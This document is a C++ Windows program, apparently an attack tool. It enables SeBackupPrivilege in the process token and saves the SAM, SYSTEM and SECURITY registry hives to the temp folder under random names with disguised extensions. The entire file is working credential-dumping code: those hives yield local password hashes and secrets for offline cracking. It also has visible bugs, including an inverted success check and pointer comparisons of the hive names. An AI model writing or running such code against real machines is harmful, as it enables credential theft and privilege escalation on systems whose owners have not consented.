#include <Windows.h>
#include <iostream>
#include <chrono>
#define privName SE_BACKUP_NAME

int enPrivilege(LPCWSTR privNamei, HANDLE hToken, LUID lidToCheck) {

	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = lidToCheck;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		std::cerr << "[-] AdjustTokenPrivileges failed :" << GetLastError() << std::endl;
		return 1;
	}
	std::wcout << L"[+] Privilege Enabled";
	return 0;
}

std::wstring a2G(int a = 1000, int b = 9999) {
	auto t = std::chrono::steady_clock::now().time_since_epoch().count();
	int n = a + (t % (b - a + 1));
	std::wstring s;
	do {
		int d = n % 16;
		s = wchar_t(d < 10 ? '0' + d : 'A' + d - 10) + s;
		n /= 16;
	} while (n);
	return s;
}

int hiveDump(LPCWSTR kName) {
	HKEY hKey;
	LONG status = RegOpenKeyExW(HKEY_LOCAL_MACHINE,kName,REG_OPTION_BACKUP_RESTORE,READ_CONTROL,&hKey);
		if (status != ERROR_SUCCESS) {
			std::wcerr << L"[!] RegOpenKeyEx failed: " << status << std::endl;
			return 1;
		}
		
		wchar_t tmpPath[MAX_PATH];
		DWORD path = GetTempPathW(MAX_PATH, tmpPath);
		std::wstring filePath = tmpPath;
		std::wstring nice = a2G();
		filePath += nice;
		if (kName == L"SAM") {
			filePath += L".bam";
		} else if
			(kName == L"SECURITY") { filePath += L".bec"; }
		else if (kName == L"SYSTEM") { filePath += L".bsy"; }

		LONG status1 = RegSaveKeyExW(hKey, filePath.c_str(), NULL, REG_NO_COMPRESSION);
		if (status1 != ERROR_SUCCESS) {
			std::wcerr << L"[!] RegSaveKeyExW failed: " << status1 << std::endl;
			return 1;
		}
		RegCloseKey(hKey);
		return 0;

}

int main() {
	
	HANDLE hToken;
	DWORD dwSize = 0;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		std::wcerr << L"[-] Failed to get the Process Token: " << GetLastError();
		CloseHandle(hToken);
		return 1;
	}
	GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
		std::cerr << "[-] Failed to get required buffer size.\n";
		CloseHandle(hToken);
		return 2;
	}

	PTOKEN_PRIVILEGES pPriv = (PTOKEN_PRIVILEGES)malloc(dwSize);
	if (!GetTokenInformation(hToken, TokenPrivileges, pPriv, dwSize, &dwSize)) {
		std::wcerr << "[-] GetTokenInformation failed: " << GetLastError();
		free(pPriv);
		CloseHandle(hToken);
		return 3;
	}
	
	LUID lidToCheck;
	if (!LookupPrivilegeValueW(NULL, privName, &lidToCheck)) {
		std::wcerr << "[-] LookupPrivilegeValue failed: " << GetLastError();
		free(pPriv);
		CloseHandle(hToken);
		return 4;
	}

	int bPriv = 0;
	for (DWORD i = 0; i < pPriv->PrivilegeCount; ++i) {

		const LUID luid = pPriv->Privileges[i].Luid;
		if (luid.LowPart == lidToCheck.LowPart && luid.HighPart == lidToCheck.HighPart) {
			bPriv = 1;
			if (pPriv->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) {
				std::wcout << L"[+] " << privName << L" is ENABLED.\n";
				break;
				
			}
			else {
				std::wcout << L"[!]" << privName << L" is PRESENT but DISABLED.\n";
				std::wcout << L"[+] Switching Privilege\n";
				if (!enPrivilege(privName, hToken, lidToCheck)) {
					std::wcout << L"[-]Adjusting Privilege Failed";
				}
			break;
			}
		}

	}
	if (!bPriv) {
		std::wcout << L"[-]Privilege Not Present in Token";
		return 5;
	}

	hiveDump(L"SAM");
	hiveDump(L"SYSTEM");
	hiveDump(L"SECURITY");

	return 0;
}

